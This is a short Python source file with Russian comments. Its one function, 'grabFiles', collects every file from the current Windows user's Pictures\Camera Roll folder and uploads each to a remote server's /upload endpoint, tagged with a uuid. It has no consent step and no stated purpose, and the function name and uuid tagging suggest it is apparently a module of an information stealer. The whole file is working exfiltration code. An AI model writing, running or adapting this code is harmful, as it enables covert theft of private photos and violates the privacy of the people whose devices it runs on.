import os
import uuid
import requests

def grabFiles(url, uuid):
	# Получаем путь к папке Camera Roll
	profile_path = os.path.join("C:\\Users", os.getlogin(), "Pictures", "Camera Roll")

	# Проверяем существование папки
	if os.path.exists(profile_path):
		print("Папка Camera Roll существует.")

		# Получаем список файлов в папке
		files = os.listdir(profile_path)

		# Проверяем, есть ли в списке файлов что-то помимо desktop.ini
		files_to_upload = [file for file in files if file != 'desktop.ini']

		if files_to_upload:
			print("В папке Camera Roll есть файлы для отправки:")
			for file in files_to_upload:
				file_path = os.path.join(profile_path, file)
				with open(file_path, 'rb') as f:
					files = {'file': f}
					data = {'uuid': uuid}
					response = requests.post(f"{url}/upload", files=files, data=data)
					if response.status_code == 200:
						print(f"Файл {file} успешно отправлен.")
					else:
						print(f"Ошибка при отправке файла {file}: {response.text}")
			print("Все файлы обработаны.")
		else:
			print("В папке Camera Roll нет файлов для отправки.")
	else:
		print("Папка Camera Roll не существует.")